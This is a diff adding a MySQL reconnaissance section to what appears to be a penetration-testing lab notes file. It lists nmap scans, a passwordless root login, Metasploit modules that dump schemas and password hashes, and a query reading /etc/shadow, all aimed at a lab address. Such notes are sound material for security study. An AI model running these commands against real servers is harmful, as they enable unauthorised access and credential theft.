@@ -307,7 +307,55 @@ set RHOSTS 192.30.247.3
 run
 ```
 
-20)  
+20)  MySQL Recon: Basics
+
+```
+nmap -sV 192.71.145.3
+mysql -h 192.71.145.3 -u root
+show databases;
+use books;
+select count(*) from authors;
+msfconsole
+use auxiliary/scanner/mysql/mysql_schemadump
+set RHOSTS 192.71.145.3
+set USERNAME root
+set PASSWORD ""
+exploit
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set RHOSTS 192.71.145.3
+set VERBOSE false
+set PASSWORD ""
+exploit
+use auxiliary/scanner/mysql/mysql_file_enum
+set RHOSTS 192.71.145.3
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+set PASSWORD ""
+exploit
+mysql -h 192.71.145.3 -u root
+select load_file("/etc/shadow");
+use auxiliary/scanner/mysql/mysql_hashdump
+set RHOSTS 192.71.145.3
+set USERNAME root
+set PASSWORD ""
+exploit
+nmap --script=mysql-empty-password -p 3306 192.71.145.3
+nmap --script=mysql-info -p 3306 192.71.145.3
+nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
+nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
+nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
+nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3
+nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3
+nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 192.71.145.3
+```
+
+21)  
+
+```
+
+```
+
+22)  
 
 ```
 
